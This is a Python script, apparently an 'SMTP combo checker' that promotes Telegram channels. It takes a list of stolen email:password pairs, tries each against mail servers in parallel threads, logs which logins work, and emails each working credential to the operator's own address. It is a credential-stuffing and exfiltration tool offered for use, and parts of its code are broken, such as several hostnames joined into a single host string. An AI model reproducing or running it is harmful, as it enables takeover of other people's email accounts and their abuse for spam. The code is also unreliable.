from __future__ import unicode_literals
_H='Die => %s:%s\n'
_G='Smtps Combo Result/Die-{}.txt'
_F='LIVE => %s:%s\n'
_E='Smtps Combo Result/Live-{}.txt'
_D=' Live{} ==> {}:{}'
_C='From: %s\nTo: %s\nSubject: %s\nDate: %s\n\n%s'
_B='%d/%m/%Y %H:%M'
_A='Enjoy With The Matrix'
import ctypes,datetime,getpass,os,random,requests,smtplib,socket,sys,threading,time
from colorama import Fore
from colorama import Style
from colorama import init
from platform import system
from time import time as timer
init(autoreset=True)
hmer=Fore.RED
zreq=Fore.BLUE
chiby=Fore.CYAN
wh=Fore.WHITE
sfar=Fore.YELLOW
khder=Fore.GREEN
sd=Style.DIM
mauv=Fore.MAGENTA
sn=Style.NORMAL
sb=Style.BRIGHT
res=Style.RESET_ALL
live=0
die=0
try:os.mkdir('Smtps Combo Result')
except:pass
def logo():
	A='\x1b[0m';B=[36,32,34,35,31,37];C=f"""
⠀⠀⠀⠀⠀⠀⠀
\t\t\t  ██████  ███▄ ▄███▓▄▄▄█████▓ ██▓███      ▄████▄   ▒█████   ███▄ ▄███▓ ▄▄▄▄    ▒█████  
\t\t\t▒██    ▒ ▓██▒▀█▀ ██▒▓  ██▒ ▓▒▓██░  ██▒   ▒██▀ ▀█  ▒██▒  ██▒▓██▒▀█▀ ██▒▓█████▄ ▒██▒  ██▒
\t\t\t░ ▓██▄   ▓██    ▓██░▒ ▓██░ ▒░▓██░ ██▓▒   ▒▓█    ▄ ▒██░  ██▒▓██    ▓██░▒██▒ ▄██▒██░  ██▒
\t\t\t  ▒   ██▒▒██    ▒██ ░ ▓██▓ ░ ▒██▄█▓▒ ▒   ▒▓▓▄ ▄██▒▒██   ██░▒██    ▒██ ▒██░█▀  ▒██   ██░
\t\t\t▒██████▒▒▒██▒   ░██▒  ▒██▒ ░ ▒██▒ ░  ░   ▒ ▓███▀ ░░ ████▓▒░▒██▒   ░██▒░▓█  ▀█▓░ ████▓▒░
\t\t\t▒ ▒▓▒ ▒ ░░ ▒░   ░  ░  ▒ ░░   ▒▓▒░ ░  ░   ░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒░   ░  ░░▒▓███▀▒░ ▒░▒░▒░ 
\t\t\t░ ░▒  ░ ░░  ░      ░    ░    ░▒ ░          ░  ▒     ░ ▒ ▒░ ░  ░      ░▒░▒   ░   ░ ▒ ▒░ 
\t\t\t░  ░  ░  ░      ░     ░      ░░          ░        ░ ░ ░ ▒  ░      ░    ░    ░ ░ ░ ░ ▒  
\t\t\t      ░         ░                        ░ ░          ░ ░         ░    ░          ░ ░  
\t\t\t                                         ░                                  ░          

          

                                                                {wh}Contact me : {sfar}t.me/Owner_Vanguard{res}

                                                                         {chiby}t.me/vanguardexploit{sfar}
         









"""
	for(E,D)in enumerate(C.split('\n')):sys.stdout.write('\x1b[1;%dm%s%s\n'%(random.choice(B),D,A));time.sleep(.05)
def cr():
	try:
		if os.name=='nt':os.system('cls')
		else:os.system('clear')
	except:pass
def checker_ssl(O0OO0OOO0O00O0OO0,O0OOO0O0000OO000O):
	I='Smtps';B=O0OOO0O0000OO000O;A=O0OO0OOO0O00O0OO0;global die;global live
	while True:
		ctypes.windll.kernel32.SetConsoleTitleW('The Matrix |Will Check {}|Live- {} |Die- {}'.format(totalnum,live,die))
		try:
			C=smtplib.SMTP(host,port);C.ehlo();C.starttls();C.login(A,B);J=_A;E=datetime.datetime.now().strftime(_B)
			if'@'not in A:F=A+'@the-matrix.com'
			else:F=A
			G=F;H=str(email);K='========= Result Smtp Combo =========\n E-mail : {}\n E-mail Password : {}\n Host : {}\n Port : {}\n========= | + The Matrix + | ========='.format(A,B,host,port,E);L=_C%(G,H,J,E,K);C.sendmail(G,H,L);C.quit();print(_D.format(khder,res,A,B));D=open(_E.format(I),'a');D.write(_F%(A,B));live+=1
		except Exception as D:D=open(_G.format(I),'a');D.write(_H%(A,B));die+=1
		break
def checker_(OOOO0OO0O0O0OO000,O0O0OO0OO0OOOO0O0):
	B=O0O0OO0OO0OOOO0O0;A=OOOO0OO0O0O0OO000;global die;global live
	while True:
		ctypes.windll.kernel32.SetConsoleTitleW('{}|Live- {} |Die- {}'.format(totalnum,live,die))
		try:
			C=smtplib.SMTP(host,port);C.ehlo();C.login(A,B);H=_A;I=datetime.datetime.now().strftime(_B)
			if'@'not in A:E=A+'@TheMatrix.com'
			else:E=A
			F=E;G=str(email);J='========= Result Smtp Combo =========\n E-mail : {}\n E-mail Password : {}\n Host : {}\n Port : {}\n SSL/TLS : Off\n========= The Matrix ========='.format(A,B,host,port);K=_C%(F,G,H,I,J);C.sendmail(F,G,K);C.quit();print(_D.format(khder,res,A,B));D=open(_E.format(host),'a');D.write(_F%(A,B));live+=1
		except Exception as D:D=open(_G.format(host),'a');D.write(_H%(A,B));die+=1
		break
def thread():
	G='smtp.mail.yahoo.com';D=':';global email;global host;global passw;global port;global totalnum;global user;host='smtp.office365.com'+'smtp.gmail.com'+'smtp.live.com'+G+'plus.smtp.mail.yahoo.com'+'smtp.mail.yahoo.co.uk'+G;port='465','587','2525','25','110','995';H=input('{}\n  SSL/TLS  y/n !{} : '.format(khder,res));email=input('{}\n Enter Your Email{} : '.format(sfar,res));print('\n {}Give Me Combo List ! {}: '.format(zreq,res),end='');I=input()
	with open(I)as J:E=J.read().split('\n')
	totalnum=len(E);print('\n{} ThreadPool :{} '.format(mauv,res),end='');F=int(input());print('{}\n ###################### [{} Start Check for {}({}{}{})] ######################'.format(res,khder,res,chiby,'All Hosts',res,port));B=[]
	if H=='n':
		for A in E:
			try:user=A.split(D)[0];passw=A.split(D)[1]
			except:continue
			C=threading.Thread(target=checker_,args=(user.strip(),passw.strip()));B.append(C);C.start()
			if len(B)==F:
				for A in B:A.join()
				B=[];continue
		time.sleep(15)
	else:
		for A in E:
			try:user=A.split(D)[0];passw=A.split(D)[1]
			except:continue
			C=threading.Thread(target=checker_ssl,args=(user.strip(),passw.strip()));B.append(C);C.start()
			if len(B)==F:
				for A in B:A.join()
				B=[];continue
		time.sleep(15)
def start():cr();logo();thread()
start()